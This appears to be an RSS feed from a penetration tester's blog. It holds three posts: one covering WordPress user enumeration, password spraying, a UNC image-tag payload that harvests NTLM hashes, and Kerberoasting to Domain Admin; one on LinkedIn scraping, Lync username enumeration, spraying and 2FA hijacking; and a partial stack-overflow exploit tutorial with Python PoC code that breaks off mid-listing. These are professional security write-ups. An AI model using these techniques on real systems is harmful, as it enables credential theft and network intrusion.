<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Shad0's House</title>
    <description>Security enthusiast. Penetration tester. Adrenaline junky.</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <pubDate>Tue, 28 Aug 2018 01:02:03 +1000</pubDate>
    <lastBuildDate>Tue, 28 Aug 2018 01:02:03 +1000</lastBuildDate>
    <generator>Jekyll v3.6.2</generator>
    
      <item>
        <title>No Responder? No problem! - Abusing HTML and UNC</title>
        <description>&lt;p&gt;When I first began learning about IT security, AV evasion meant encoding signatures, and &lt;code class=&quot;highlighter-rouge&quot;&gt;' OR '1' = '1&lt;/code&gt; was enough to get into most web applications. 14 years later, security has evolved into a much different
landscape. While the above techniques certainly still work in some cases, today’s networks are much more complex. AV’s now have sandboxes and emulators, and web applications are protected on the 7th layer.
The last thing a consultant wants during an engagement is to be caught because one of their payloads tripped a defense mechanism.&lt;/p&gt;

&lt;p&gt;A few months ago I was part of a purple team engagement, during which a client hired us to both test their internal network security as well as their newly hired SOC’s ability to catch malicious activity.
This was an interesting engagement because unlike most regular internal engagements, we had a team actively looking for us. This meant using our standard tools became too risky, so we had to think of a different
approach.&lt;/p&gt;

&lt;h3 id=&quot;1-getting-credentials-responder-maybe-not&quot;&gt;1. Getting credentials: Responder? Maybe not.&lt;/h3&gt;
&lt;p&gt;After a quick kickoff meeting we were off. Normally, in a regular internal penetration test this is where I would fire up wireshark and start listening for NBT-NS and LLMNR broadcasts. If found, fire up Responder,
collect some Net-NTLM hashes, throw hashcat at them and in some cases, r00t dance. However, we figured this would likely get us caught. To explain why, lets go back to how and why Responder works. I am not going to go
into the details of Responder and NBT-NS/LLMNR poisoning as the internet is filled with explanations of the attack. Suffice to say that when DNS fails to resolve a hostname for whatever reason 
(user “fat fingers” the name, DNS UDP packet - yes, &lt;a href=&quot;https://www.ietf.org/rfc/rfc1035.txt&quot;&gt;UDP&lt;/a&gt; - gets dropped, or some other reason) it turns back to Link Layer Multicast Name Resolution and NetBios name
service to resolve the name. It does this by sending a broadcast literally asking who the host is.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/responder/Query_Broadcast.png&quot; alt=&quot;Who there&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is where Responder comes in. Depending on how its run, Responder may reply to some/all queries saying saying yep thats me. This then kicks off the NTLM authentication scheme and results in the 
challenge-response Net-NTLM hash we then proceed to crack or relay.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/responder/response.png&quot; alt=&quot;l00t&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So, now that we know how the attack works, can you think of how detection works? Well, if Responder is run to respond to all queries where DNS fails, it will respond to everything. If a security appliance
were to broadcast someting that it knows is not present in the network like \\thisdoesnotexist\, it can assume that anything that responds to this will likely be malicious and raise a flag.&lt;/p&gt;

&lt;p&gt;Well, the network is safe, lets pack it up and go home, blue team won.&lt;/p&gt;

&lt;p&gt;Not quite.&lt;/p&gt;

&lt;p&gt;Enumerating the network further we found the intranet 
page. A quick look revealed it was running WordPress, which meant if we could just get access to an account we could probably get code execution. Again, a vulnerability
scanner like WPScan would have been great here, but as stealth was important we opted for a manual approach. Examination revealed a fully patched installation, and looking through some of the source 
we saw references to a security plugin which made things a bit harder. We had two options. Either find an 0day in a plugin/Wordpress, which in a time boxed engagement is basically a no go, or compromise a user account.
Wordpress has a very handy feature that allows for username enumeration by appending &lt;code class=&quot;highlighter-rouge&quot;&gt;/?author=1&lt;/code&gt; to the url. We tested this in the browser and succesfully got the username of the first account.
We then scripted the attack, being mindful of pausing a few minutes between requests, and tried enumerating the first 100 accounts. This yielded 76 different user accounts. We then tried a password spray with
good ol’ &lt;code class=&quot;highlighter-rouge&quot;&gt;Password1&lt;/code&gt; (you’d be surprised how many times that works) and success! 4 accounts went down, one of which was an administrator.&lt;/p&gt;

&lt;p&gt;A backdoor on one of the theme pages got us code execuion on the server, which showed WordPress running as a restricted user. Looking for easy kills for privilege escalation did not result in anything obvious
so instead we opted to leverage our WordPress access to harvest some Net-NTLM hashes.&lt;/p&gt;

&lt;p&gt;Net-NTLM hashes are the result of the NTLM challenge-response authentication scheme. Basically, when client A tries to access a resource on Server B, it must authenticate against it first. The process can be found in &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/SecAuthN/microsoft-ntlm&quot;&gt;Microsoft documentation&lt;/a&gt;
but sumarized below:&lt;/p&gt;

&lt;hr /&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;(Interactive authentication only) A user accesses a client computer and provides a domain name, user name, and password. The client computes a cryptographic hash of the password and discards the actual password.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The client sends the user name to the server (in plaintext).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The server generates a 16-byte random number, called a challenge or nonce, and sends it to the client.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The client encrypts this challenge with the hash of the user’s password and returns the result to the server. This is called the response.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The server sends the following three items to the domain controller:
  User name
  Challenge sent to the client
  Response received from the client&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The domain controller uses the user name to retrieve the hash of the user’s password from the Security Account Manager database. It uses this password hash to encrypt the challenge.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The domain controller compares the encrypted challenge it computed (in step 6) to the response computed by the client (in step 4). If they are identical, authentication is successful.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;
&lt;p&gt;There are significant differences between NTLMv1 and NTLMv2, but thats a topic for a different post. As we are dealing with windows 7/2008+ systems, NTLM here refers to NTLMv2.&lt;/p&gt;

&lt;p&gt;From the above we can see that if we can somehow get someone to try and access a resource on our system (acting as the server on the above example), we’ll be able to grab the Net-NTLM hash. 
There are many different ways of accomplishing this but the more interesting one given the circumstances is through HTML.
IE and EDGE (although ive succesfully tested with Chrome as well) both support UNC paths to load resources (such as images). An image tag like &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img src=&quot;\\x.x.x.x\doesnotmatter.png&quot; /&amp;gt;&lt;/code&gt; would try to pull
&lt;code class=&quot;highlighter-rouge&quot;&gt;doesnotmatter.png&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;x.x.x.x&lt;/code&gt;, which would kick off the authentication process with &lt;code class=&quot;highlighter-rouge&quot;&gt;x.x.x.x&lt;/code&gt;. Since the code executes in the browser of the client browsing our evil page, 
the resulting hash would belong to the user using the browser.&lt;/p&gt;

&lt;p&gt;So, to recap: We have managed to gain administrative access to the WordPress site of the companies internal intranet, where it is safe to assume most browsers will land on when opened, and a way to abuse
evil html to grab NetNTLM hashes. See where im going with this?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/responder/wp.png&quot; alt=&quot;knock knock&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Before saving the above, I started Metasploit’s SMB server to catch all incoming connections. Note that I could have also used Impacket’s smbserver.py or even Responder by disabling the responses to queries,
but Metasploit was just convenient at the time. As soon as the server was started and the file saved, hashes from all over the domain started flying in! In total I believe we gathered over 200 hashes in under an 
hour.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/responder/msf.png&quot; alt=&quot;Who there&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Edit: If administrative access is available or there is access to a system with wireshark installed, and our smbserver tools are not available, I strongly recommend collecting hashes&lt;/em&gt;
&lt;em&gt;with wireshark. Once enough hashes have been collected, bring the pcap over to a linux box and extract the NetNTLM hashes with &lt;a href=&quot;https://github.com/DanMcInerney/net-creds&quot;&gt;this&lt;/a&gt; fantastic tool&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&quot;pwning-the-domain-red-team-1-blue-team-0&quot;&gt;Pwning the Domain: Red team 1, Blue team 0&lt;/h3&gt;

&lt;p&gt;With plenty of hashes, the next step was to crack them and begin moving laterally. Hashcat cracked roughly 20 accounts in a relatively short period of time. Checking these account’s permissions we discovered
that none had elevated privileges. No matter, with domain credentials its usually only a matter of time before the domain goes down. Remembering the SOC’s watchfull eyes over us, we kept our recognizance
to a minimum to prevent tripping any alert from monitoring systems. Instead, we opted for what are considered easy kills, which meant Kerberoasting.&lt;/p&gt;

&lt;p&gt;Kerberoasting is the name of the attack given by &lt;a href=&quot;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&quot;&gt;Tim Medina in 2014&lt;/a&gt; to attacking Microsoft Windows Kerberos authentication. 
While a full description is out of scope, The following graphic taken from &lt;a href=&quot;https://technet.microsoft.com/pt-pt/library/cc772815(v=ws.10).aspx&quot;&gt;Microsoft&lt;/a&gt; illustrates the basics we need to understand for this attack:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/responder/kerberos.gif&quot; alt=&quot;Kerberos&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To summarize the above, at logon, the client contacts the Key Distribution Center (KDC) and requests a Ticket Ticket Grating Ticket (TGT) from the KDC. The KDC valdiates the users information, such as 
permissions and group memberships, and if they check out it will issue a TGT. If the user then wishes to access a service, it will need to supply the TGT as well as the target’s service principal
name (SPN). A SPN &lt;a href=&quot;https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx&quot;&gt;is the name by which a Kerberos client uniquely identifies an instance of a service for a given Kerberos target computer&lt;/a&gt;
After verifying the data in the TGT (which only the KDC can read). the KDC will issue a TGS back to the client which &lt;em&gt;is signed with the target SPN’s NTLM hash&lt;/em&gt;. The TGS will then be presented to the service, 
which will ultimately decide whether or not to provide access.&lt;/p&gt;

&lt;p&gt;We are interested in step 3/4. In modern systems, Kerberos uses AES encryption to encrypt the TGS ticket. However, this was not introduced until &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-vista/cc749438(v=ws.10)&quot;&gt;Windows Vista/ and Windows 2008&lt;/a&gt;. 
Since Active Directory’s introduction in Windows 2000, Windows has used RC4_HMAC symmetric encryption which uses the target SPN’s NT (or NTLM as some of you may know it)
hash as the encryption/decryption key! Even though AES is the default, RC4 is still found due to
compatability requriements (since some services/systems do not yet support AES). If we look at the graffic above, any user can request a TGT from the KDC with valid domain credentials.
These do not have to belong to any privileged group - Kerberos lets the target service/system decide whether or not to grant permission to the user to use the service - which means any low privilege account can
get as many TGS tickets for different SPN’s as we want! There are certain restrictions in regards to which SPN’s are better for cracking and why, and if you’d like to know more I strongly recommend going &lt;a href=&quot;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&quot;&gt;here&lt;/a&gt;
and &lt;a href=&quot;https://adsecurity.org/?p=2293&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Cool, so how does this help us? Well, the accounts created for services are usually over permissioned and part of the Domain Admin’s group, as well as have passwords that are set to not expire, usually created
by a human (which as we know are horrible at creating truly random passwords). This means if we request TGS tickets encrypted with RC4 for a specific (or all available) SPN’s, we can then attempt to open the tickets
by computing various NTHashes and trying to open the ticket. If we are succesful, it means we have the correct NTHash, which means we would have found the correct password for the target service account!
The best part? &lt;strong&gt;&lt;em&gt;All this is done offline&lt;/em&gt;&lt;/strong&gt;. The attack is very hard to detect, because there are no explotis being launched, no malware being placed on any target system, and no bruteforcing being done against
AD. Although there &lt;a href=&quot;https://adsecurity.org/?p=3513&quot;&gt;are ways to detect the attack&lt;/a&gt;, we felt fairly confident the logs were not being monitored to this degree.&lt;/p&gt;

&lt;p&gt;We used Impacket’s GetSPNs.py to request a list of all suiteable SPN’s for cracking using one of the cracked accounts, and got to work. A short time later, there was a hit. Sure enough, after checking the account’s
group membership there it was: Domain Admins.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/responder/getuserspn.png&quot; alt=&quot;Kerberos&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From here it was easy to grab the crown jewels. A few screen shots later, we had everythind we needed and the engagement was done. Throughout the whole test we managed to stay hidden from the SOC and raised no flags. 
As part of the engagement, our report was given to them, and we had the chance to work with them on defenses and indicators against the above attacks. 
In both WordPress and Kerberoasting instances, the underlying issue was not enforcing the least privilege principle. Over permissioned accounts in WordPress with weak credentials led to the disclosure of 
hundreds of domain account hashes, which gave us the foothold required to request TGS tickets. Weak passwords allowed these to be cracked, which once again due to excessive permissions led to the 
compromise of the whole Active Directory environment.&lt;/p&gt;

</description>
        <pubDate>Fri, 10 Aug 2018 20:04:23 +1000</pubDate>
        <link>http://localhost:4000/2018/Responder/</link>
        <guid isPermaLink="true">http://localhost:4000/2018/Responder/</guid>
        
        <category>Stealth,</category>
        
        <category>Evasion,</category>
        
        <category>Internal</category>
        
        
        <category>Internal</category>
        
      </item>
    
      <item>
        <title>Breaking the perimeter: LyncSmash &amp; Linkedin2username</title>
        <description>&lt;p&gt;In this blog I am going to cover some little known tools that have proven extremely valuable when breaching the perimeter during external engagements. I think most penetration testers will agree that in the 
majority of cases, the perimeter is rarely breached with CVE’s (although one still finds the odd lone forgotten server at some obsuce subdomain). Instead of attacking the technologies at the different
endpoints, I prefer to attack the weakest link in the security chain: Humans. Wether it is through social engineering, phishing, or password attacks, humans tend to be the easiest to exploit.&lt;/p&gt;

&lt;p&gt;A few weeks ago I was on an external engagement against a fairly large company. Initial recogniance revealed many interesting subdomains, however most were placed behind an authenticated gateway, meaning I could
not reach them without valid credentials. This severely reduced my attack surface which was slightly annoying. Initially, the only two exposed servers I could access was a fairly new exchange server with no exploitable
vulnerabilities and a 2013 Microsoft Lync server. One possible attack here would be to come up with a list of probable usernames using the email convention from my point of contact and perform a password spray 
against the Lync server, however first i’d need a list of employees to try.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Lync/lync.png&quot; alt=&quot;Always a welcome sight on externals&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A few months ago, a colleague of mine released a tool called &lt;a href=&quot;https://gitlab.com/initstring/linkedin2username/&quot;&gt;Linkedin2username&lt;/a&gt;. The tool is a scraper that will take in a company name, and login 
parameters. It will then log into LinkedIn and do a search for all employees of said company, which it then saves locally. Finally, it will grab the first and last name and compose a  list of probable usernames 
using common email conventions such as firstname.lastname, lastname.f, firstname.l and so on. This is incredibly useful when used in conjuction with username enumeration flaws, as it provides a very 
comprehensive list of posible usernames we can then attack.&lt;/p&gt;

&lt;p&gt;I ran the tool against the company which identified roughly 700 users. Awesome! Although there were bound to be some invalid or old names in there, I figured most would be valid, and felt pretty good
about my chances of finding a user with Password1, Winter2018 or something of the sort. Rather than attempting all different convetions (over 2000 usernames), I decided to use the convention from emails found
during recon.&lt;/p&gt;

&lt;p&gt;The last piece needed for my attack was the domain the users belonged to. This is where Lyncsmash comes in. &lt;a href=&quot;https://github.com/nyxgeek/lyncsmash&quot;&gt;LyncSmash&lt;/a&gt; developed by nyxgeek is a collection of tools for attacking self hosted
Microsoft Lync installations. If you’d like to read the details behind how it works I strongly suggest you read &lt;a href=&quot;https://www.trustedsec.com/2017/08/attacking-self-hosted-skype-businessmicrosoft-lync-installations/&quot;&gt;this&lt;/a&gt; blog post.
Self hosted Lync installations suffer from multiple information disclosure flaws. First, many folders are protected with NTLM over http authentication. This means if we send an authentication request with null 
credentials, we will receive a &lt;a href=&quot;https://blog.gdssecurity.com/labs/2014/2/12/http-ntlm-information-disclosure.html&quot;&gt;NTLMSSP&lt;/a&gt; message, which leaks Netbios, DNS and host information.&lt;/p&gt;

&lt;p&gt;It is worth noting here that this is not a vulnerability, but rather a flaw design in the protocol so this will likely never be fixed. I used the http-ntlm-info nmap script to enumerate the server, 
using the /abs/ directory as the authentication target:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Lync/nmap.png&quot; alt=&quot;Nmap script results against /abs/&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Great! I now had the domain information. The second information disclosure flaw is a username enumeration flaw. Attempting to login with a valid username will return a response much quicker than an invalid 
username. This flaw was reported to Microsoft, who do not aknowledge it as a vulnerability, meaning it is likely never going to be patched.&lt;/p&gt;

&lt;p&gt;At this point I had everything needed for my attack. I used the list produced by LinkedIn2username that conformed to the email convention for the target, and sprayed two passwords across all accounts. 
If the password lockout threshold of the target is not known, I strongly recommend keeping the spray at 1/2 passwords per day. Otherwise you risk locking out the valid accounts, which will not only be extremely
noisy but can also have a significant business impact for the target. You’ve been warned.&lt;/p&gt;

&lt;p&gt;Invalid usernames with the incorrect credentials will produce the following output:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Lync/invalid.png&quot; alt=&quot;No succesfull logins here!&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Where as a correct login will produce the following result:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Lync/valid.png&quot; alt=&quot;And we score!!&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Booya! valid creds! I let the script continue and ended up with 4 valid accounts. Great, now to log in to the portal….&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Lync/modded.png&quot; alt=&quot;So close but yet so far...&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After logging I was greeted with a lovely 2FA input field asking me for a Google authenticator token. hmmm. Game over? Not yet! Remember that exchange server that was exposed?
I took my credentials there and what do you know, no MFA! All of the accounts enumerated were a goldmine. One belonged to someone in a manager type role, who appeared to get automated emails every time
a new employee was hired. In those emails were details about the employees start date, instructions to set up their Google 2FA aaand…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Lync/email.png&quot; alt=&quot;Yep...temporary plaintext credentials&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I picked a few accounts that had not started yet and therefore were not set up and proceeded to hijack their 2FA set up. I was succesfull in registering my device, and was able to use a few of the newly 
hijacked accounts to access the companies intranet and external resources. From here it was simply a matter of more enumeration until I was able to VPN into their internal network. Game over.&lt;/p&gt;

&lt;p&gt;I hope the above post highlights the power of these two tools when used together, and how dangerous a simple information disclosure flaw can be to an organization under the right conditions.&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

</description>
        <pubDate>Wed, 11 Jul 2018 01:04:23 +1000</pubDate>
        <link>http://localhost:4000/2018/Gaining-a-Foothold/</link>
        <guid isPermaLink="true">http://localhost:4000/2018/Gaining-a-Foothold/</guid>
        
        <category>OSINT,</category>
        
        <category>External,</category>
        
        <category>Lync,</category>
        
        <category>Foothold,</category>
        
        <category>Enumeration,</category>
        
        <category>Skype</category>
        
        <category>for</category>
        
        <category>business</category>
        
        
        <category>External</category>
        
      </item>
    
      <item>
        <title>Stack Overflow with a twist</title>
        <description>&lt;p&gt;In the following post I will conver very basic Windows x86 Stack overflow exploit development. This is a continuation of our Fuzzing post, and the starting point will be the PoC covered then.&lt;/p&gt;

&lt;p&gt;So, to recap: We have fuzzed the Easy file sharing Web server  by creating a custom fuzzing template for SPIKE. This resulted in the “discovery” of a nice buffer overflow present in the sendmail.ghp service,
accessible publicly without any authentication. After fuzzing and playing with the buffer length, we found the buffer overflow can be triggered by posting a sequence of 4144 A’s. 
From this we created a skeleton PoC that is enough to crash  and cause a DoS in the application, but what fun is that?&lt;/p&gt;

&lt;p&gt;Lets attach the Easy file server to immunity and take a look at the registers during normal execution. Run the EFS.exe program, then attach it to immunity by navigating to file &amp;gt; attach and selecting the 
EFS process from the list. Then click attached.&lt;/p&gt;

&lt;p&gt;Once attached, the program execution will be paused. To resume, click on the play button in immunity’s toolbar. At this point lets take a look at the registers and memory. Mine looks as follows:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Stack/Overview.png&quot; alt=&quot;Immunity Overview&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So whats going on here? dont let the debugger intimidate you, for now lets look at the basics. The top left is the dissassembly window and it shows us the processor instructions. When a program is compiled,
the compiler turns our C code into machine readable instructions. Our code is turned into a sequence of simple instructions that manipulate the registers of the CPU. These instructions are
called Opcodes, and what we see in the dissassembly view is the hex representation of these instructions.&lt;/p&gt;

&lt;p&gt;To the right of the dissassembly view we have a view of the CPU registers. For now, we will be interested in the general purpose registers, specifically the stack pointer (ESP), the Base pointer (EBP) and the
instruction pointer (EIP). Generally when a function is called, a new stack frame is located at the current ESP location. The value of ESP is then moved into EBP (mov EBP, ESP) so that EBP = ESP. 
When parameters are passed to the function they are pushed onto the stack. Since the stack pointer always points to the top of the stack, pushing onto the stack causes ESP to grow towards a more 
negative address while the base pointer remains unmodified. This allows the program to refer to local function variables passed to the function as offsets of the base pointer. 
The EIP register is the most important register in exploit development. The instruction pointer acts like a finger that moves along a page you are reading. The EIP holds the address of the instruction
currently being executed by the CPU. Therefore, if we are able to take control of this register we could theoretically redirect the program’s execution flow to a part in memory. Now what if we could also
place our own code in memory?&lt;/p&gt;

&lt;p&gt;Below the register view we have our Stack view. ESP will always sit at top of the stack. Here we can see the status of our current stack, as well as previously called functions that remain on the stack.
The stack can be modified by push/pop instructions. For Example, a  PUSH EAX  instruction will push the 4 bytes stored in EAX onto the stack (and cause the stack to grow by 4 bytes) while a POP EAX instruction will 
remove the last 4 bytes from the stack and “pop” them into EAX, therefore setting EAX’s value to this.&lt;/p&gt;

&lt;p&gt;Lastly, below the dissassembly view we have the dump view. The dump view will show us the hex view of the instructions at a specified address. For example, if we right click on ESP and select follow in dump
we will be able to see the instructions located at ESP and follow them in the dump.&lt;/p&gt;

&lt;p&gt;Ok, with that out of the way, lets begin the fun stuff. Lets fire out PoC and see what we can learn from the debugger.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/images/Stack/Crash.png&quot; alt=&quot;Nothing to see here, just a crash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Our application crashed with an Access violation error. Lets take a look at the registers, specifically EIP. See something interesting? EIP has been overwritten by 41’s! Turns out that
&lt;code class=&quot;highlighter-rouge&quot;&gt;\x41&lt;/code&gt; is the hex representation of our ASCII A. We have just overflowed the buffer which has caused us to overwrite the instruction pointer. If you recall, the EIP is in charge of telling the program
what instruction to execute next. In this case  the program crashed as it can not interpret any instructions located at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x41414141&lt;/code&gt;. But what if we supplied a valid address? Preferably with our own set of
instructions? Lets keep looking and see what else we can learn from the crash.&lt;/p&gt;

&lt;p&gt;If we look at the stack pointer, we can see that we have also overwritten the memory pointed at by the stack pointer. If we take a close look, we realize that we have 56 bytes we control at ESP. While this is
enough to get creative and write some shellcode, that is a topic for another post. Lets keep looking and seeing what else we have. If we scroll up the stack, we can see we have a much larger buffer right
before ESP! This buffer certainly looks big enough to hold just about any code we want to execute. So, we have a 56 byte buffer pointed at by ESP, and a pretty much unrestricted buffer at lower memory addresses.&lt;/p&gt;

&lt;p&gt;The easiest way to exploit this will be to use a multi stage payload. Essentially, we will use a small chunk of code at ESP that is smaller than 56 bytes to jump to our largely controlled buffer where
we can execute any payload we want.&lt;/p&gt;

&lt;p&gt;So, here is what we need to do:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Bad Char Check&lt;/li&gt;
  &lt;li&gt;Verify control of EIP&lt;/li&gt;
  &lt;li&gt;Redirect execution flow to ESP&lt;/li&gt;
  &lt;li&gt;Use a small first stage payload to redirect execution into our big buffer&lt;/li&gt;
  &lt;li&gt;Choose second stage payload&lt;/li&gt;
  &lt;li&gt;R00t dance.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;1) Bad Char Check&lt;/p&gt;

&lt;p&gt;Ok, so now that we have the game plan, how do we execute it? First, we need to check for bad chars.&lt;/p&gt;

&lt;p&gt;Sometimes you will find that there are certain characters that will either mutate or truncate your payloads. Finding these characters at the beginning stages of exploit
development will save us a lot of time when troubleshooting why a 400 byte payload isnt working. The most common of these characters is the null byte, or &lt;code class=&quot;highlighter-rouge&quot;&gt;x00&lt;/code&gt;. Consider the following 2 lines:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we are declaring a 30 byte buffer to hold some chars, and the strcpy function is passing a user supplied argument into this buffer without any form of size checks. Basically, the function will copy all
the user supplied data until a null byte is encountered, which marks the end of the input string. A buffer overflow occurs when an argument larger than the allocated buffer is supplied.
This also explains why having a null byte in your code can mess things up. This character is what marks the end of the supplied string, so having it in your payload (or EIP address) can truncate our
payload and therefore crash the target.&lt;/p&gt;

&lt;p&gt;The most straightforward way to check for bad characters is to send a buffer from &lt;code class=&quot;highlighter-rouge&quot;&gt;x01&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;xff&lt;/code&gt;, then inspecting memory to see if all our characters made it onto the stack.&lt;/p&gt;

&lt;p&gt;Modify our PoC to look like below:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Usage: python EFS.py [IP]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;i.e python  EFS.py 192.168.56.101&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;EIP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;B&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;

&lt;span class=&quot;no&quot;&gt;BadChar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
